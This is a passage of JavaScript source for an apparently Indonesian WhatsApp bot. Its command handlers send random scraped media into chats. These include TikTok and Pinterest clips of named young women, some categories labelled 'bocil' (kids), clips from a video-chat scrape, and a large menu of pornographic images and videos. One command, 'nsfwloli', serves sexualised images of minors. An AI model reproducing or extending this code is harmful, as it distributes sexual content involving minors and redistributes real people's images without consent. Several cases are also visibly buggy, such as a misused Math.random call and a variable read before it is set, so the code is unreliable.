    if (/video/.test(type)) {
        return ananoffc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return ananoffc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
    await RezzHost.sendMessage(m.chat, { react: { text: '📥', key: m.key }})
    await RezzHost.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break
// BATAS TOOLS MENU

// ASUPAN MENU


case 'ometv': {
if (!isCreator) return reply2('Owners only') 
let old = new Date()
let ometv = JSON.parse(fs.readFileSync('./lib/scrape/ometv.json'))
var resultnyak = pickRandom(ometv)

if (resultnyak.includes('.mp4')) {
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By Rerez', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`${hiasan}*Fetching* : ${((new Date - old) * 1)} ms`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`*Random Ometv*`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: resultnyak } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\".ometv\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
} else {
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By Rerez', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`${hiasan}*Fetching* : ${((new Date - old) * 1)} ms`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`*Random Ometv*`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: resultnyak } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\".ometv\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}

}
break      
case 'asupan2': {
reply(mess.getdata)
let old = new Date()
const json = await chApi.asupantt(args[0] || Func.random([
            'itsbellefirst',
            'aletaanovianda',
            'faisafch',
            '0rbby',
            'cindyanastt',
            'rioramadan003'
         ]))
         let caption = `乂  *A S U P A N*\n\n`
         caption += `	◦  *Author* : ${Func.h2k(json.result.data.author.nickname)} (@${json.result.data.author.username})\n`
         caption += `	◦  *Views* : ${Func.h2k(json.result.data.stats.play_count)}\n`
         caption += `	◦  *Likes* : ${Func.h2k(json.result.data.stats.digg_count)}\n`
         caption += `	◦  *Shares* : ${Func.h2k(json.result.data.stats.share_count)}\n`
         caption += `	◦  *Comments* : ${Func.h2k(json.result.data.stats.comment_count)}\n`
         caption += `	◦  *Duration* : ${Func.toTime(json.result.data.duration)}\n`
         caption += `	◦  *Sound* : ${json.result.data.music.title} - ${json.result.data.music.author}\n`
         caption += `	◦  *Caption* : ${json.result.data.caption || '-'}\n\n`
         caption += global.footer
RezzHost.sendMessage(m.chat, { video: { url: json.result.data.video }, caption: caption }, { quoted: kalgans })
}
break
case 'asupan': {
var pklnha = `Example : ${prefix + command} ukhty\n\nOpsi Tersedia:\n• hijaber\n• ukhty\n• rika\n• bocil\n• santuy\n\nBy ${ownername}`
if (!text) throw reply(pklnha)
reply(mess.search)
if (args[0] === "bocil") {
anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/asupan/bocil.json`)
result = pickRandom(anu)
RezzHost.sendMessage(m.chat, {video:{url: result.url}, mimetype:"video/mp4", caption: `${command} ${args[0]}`}, {quoted:kalgans})
} else if (args[0] === "santuy") {
anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/asupan/santuy.json`)
result = pickRandom(anu)
RezzHost.sendMessage(m.chat, {video:{url: result.url}, mimetype:"video/mp4", caption: `${command} ${args[0]}`}, {quoted:kalgans})
} else if (args[0] === "rika") {
anu = await fetchJson(`https://github.com/MasRens/databasegames/blob/master/asupan/rika.json`)
result = pickRandom(anu)
RezzHost.sendMessage(m.chat, {video:{url: result.url}, mimetype:"video/mp4", caption: `${command} ${args[0]}`}, {quoted:kalgans})
} else if (args[0] === "ukhty") {
anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/asupan/ukhty.json`)
result = pickRandom(anu)
RezzHost.sendMessage(m.chat, {video:{url: result.url}, mimetype:"video/mp4", caption: `${command} ${args[0]}`}, {quoted:kalgans})
} else if (args[0] === "hijaber") {
anu = await fetchJson(`https://raw.githubusercontent.com/Restaa/databasegames/master/asupan/hijaber.json`)
result = pickRandom(anu)
RezzHost.sendMessage(m.chat, {video:{url: result.url}, mimetype:"video/mp4", caption: `${command} ${args[0]}`}, {quoted:kalgans})
}
}
break
case 'asupantiktok': {
reply(mess.search)
RezzHost.sendMessage(m.chat, {video:{url: `https://pitucode.com/randomasupan/asupantiktok?apikey=${pitu}` }, mimetype:"video/mp4", caption: `${command}`}, {quoted: kalgans})
}
break
case 'tiktokgirl':
reply(mess.search)
var asupan = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
RezzHost.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: kalgans })
break
case 'tiktokghea':
reply(mess.search)
var gheayubi = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
RezzHost.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: kalgans })
break
case 'tiktokbocil':
reply(mess.search)
var bocil = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
RezzHost.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: kalgans })
break
case 'tiktoknukhty':
reply(mess.search)
var ukhty = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
RezzHost.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: kalgans })
break
case 'tiktoksantuy':
reply(mess.search)
var santuy = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
RezzHost.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: kalgans })
break
case 'tiktokkayes':
reply(mess.search)
var kayes = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
RezzHost.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: kalgans })
break
case 'tiktokpanrika':
reply(mess.search)
var rikagusriani = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
RezzHost.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: kalgans })
break
case 'tiktoknotnot':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: kalgans })
break

// BATAS ASUPAN MENU


// CUCIMATA MENU

case 'cecanindo': {
if (isBan) return reply2(mess.ban)
await loading()
let { pinterest } = require('./lib/scrape/scraper')
anu = await pinterest(`cecan indo`)
result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, {image: { url: result }, caption: mess.success},{quoted:kalgans})
}
break
case 'cecanjepan': {
if (isBan) return reply2(mess.ban)
await loading()
let { pinterest } = require('./lib/scrape/scraper')
anu = await pinterest(`cecan jepang`)
result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, {image: { url: result }, caption: mess.success},{quoted:kalgans})
}
break
case 'cecanmalaysia': {
if (isBan) return reply2(mess.ban)
await loading()
let { pinterest } = require('./lib/scrape/scraper')
anu = await pinterest(`cecan malaysia`)
result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, {image: { url: result }, caption: mess.success},{quoted:kalgans})
}
break
case 'cecanhijaber': {
if (isBan) return reply2(mess.ban)
await loading()
let { pinterest } = require('./lib/scrape/scraper')
anu = await pinterest(`cecan hijaber`)
result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, {image: { url: result }, caption: mess.success},{quoted:kalgans})
}
break
case 'cecanchina': {
if (isBan) return reply2(mess.ban)
await loading()
let { pinterest } = require('./lib/scrape/scraper')
anu = await pinterest(`cecan china`)
result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, {image: { url: result }, caption: mess.success},{quoted:kalgans})
}
break
case 'cecanvietnam': {
if (isBan) return reply2(mess.ban)
await loading()
let { pinterest } = require('./lib/scrape/scraper')
anu = await pinterest(`cecan vietnam`)
result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, {image: { url: result }, caption: mess.success},{quoted:kalgans})
}
break
case 'cecankorea': {
if (isBan) return reply2(mess.ban)
await loading()
let { pinterest } = require('./lib/scrape/scraper')
anu = await pinterest(`cecan korea`)
result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, {image: { url: result }, caption: mess.success},{quoted:kalgans})
}
break
case 'cecan': {
if (isBan) return reply2(mess.ban)
await loading()
let { pinterest } = require('./lib/scrape/scraper')
anu = await pinterest(`cecan`)
result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, {image: { url: result }, caption: mess.success},{quoted:kalgans})
}
break
case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elf':
case 'estetic':
case 'kanna':
case 'wallnime':
case 'quotesimage':
await loading()
RezzHost.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } })
break
case 'killimg':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) return reply2(mess.ban)
await loading()
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
RezzHost.sendImage(from, data.url, 'Success Coy', kalgans)
})
break

// BATAS CUCI MATA

// NSFW MENU


case 'nsfw':
if (!isCreator && isPrem) return m.reply(mess.premium);
if (args[0] == 'enable' || args[0] == 'disable') {
const status = args[0] == 'enable';
if (chats.nsfw !== status) {
chats.nsfw = status;
m.reply(`Success Change To ${status ? 'ENABLE' : 'DISABLE'}`);
m.reply(`\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`)
} else {
m.reply(`Already ${status ? 'ENABLE' : 'DISABLE'}`);
}
} else {
m.reply(`Status : ${chats.nsfw ? 'ENABLE' : 'DISABLE'}`);
}
break;

case 'nsfwvid': {
	if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
reply(mess.search)
an = require('./lib/scrape/scraper')
anu = await an.hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By Rerez', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `\n${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`*Random Nsfw*`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: result912.video_1 } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\".nsfwvid\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'hentaivid2': {
if (!m.isGroup) return reply(mess.group)
if (!isCreator) return reply('kusus owner')
if (!chats.nsfw) return reply('hmm')
reply(mess.search)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
RezzHost.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: kalgans })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
reply(mess.search)
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
RezzHost.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: kalgans })
}
break
case 'tits': case 'cum_jpg': case 'lewdk': {
if (!isCreator) return reply(mess.owner)
reply(mess.wait)
RezzHost.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
}
break
case 'lewd': {
if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
RezzHost.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
}
break
case 'onlyfans': {
if (!isCreator) return reply(mess.owner)
RezzHost.sendMessage(m.chat, { image: { url: `https://api.koi.pics/api/nsfw/onlyfans?apikey=${koi}`}, caption: `🥵 Wangy Banget Kan?`})
}
break
case 'rule34':{
if (!text) return reply(`Example: ${prefix + command} milf`)
let old = new Date()
let json = await fetchJson(`https://api.xyro.fund/api/rule34img?query=${text}`)
json.data.response.forEach(async (k) => {
await RezzHost.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
}
break
case 'feets': case 'armpits': case 'ecchi': {
if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
RezzHost.sendMessage(m.chat, { image: { url: `http://api.lolhuman.xyz/api/random/nsfw/${args[0]}?apikey=${apikey}`}, caption: `🥵 Wangy Banget Kan?`})
}
break
case 'trap' :
if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: kalgans })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: kalgans })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: kalgans })
break
case 'gasm':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: kalgans })
break  
case 'milf':
if (!m.isGroup) return reply(mess.group)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break 
case 'animespank':
if (!m.isGroup) return reply2(mess.group)
if (!chats.nsfw) return reply2('hmm')
reply2(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
await RezzHost.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted: kalgans }).catch(err => {
return('Error!')
})
break
case 'ahegao':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'ass':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'bdsm':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'blowjob':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'cuckold':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'cum':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'eba':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'ero':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'femdom':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'foot':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'gangbang':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'glasses':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'hentai':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'jahy':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'manga':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'masturbation':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'neko-hentai':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'neko-hentai2':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'nsfwloli':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'orgy':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'panties':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'pussy':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'tentacles':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'thights':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'yuri':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'zettai':
if (!m.isGroup) return reply(mess.group)
	if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: kalgans })
break
case 'gifblowjob':
if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await getBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await RezzHost.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted: kalgans}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./lib/HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await RezzHost.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted: kalgans}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
RezzHost.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: kalgans })
}
break
case 'randomxnxx': {
if (!m.isGroup) return reply(mess.group)
if (!chats.nsfw) return reply('hmm')
reply(mess.wait)
heyy = await fetchJson(`https://github.com/MasRens/databasegames/blob/master/nfsw/xxx.json`)
let yeha = pickRandom(heyy)
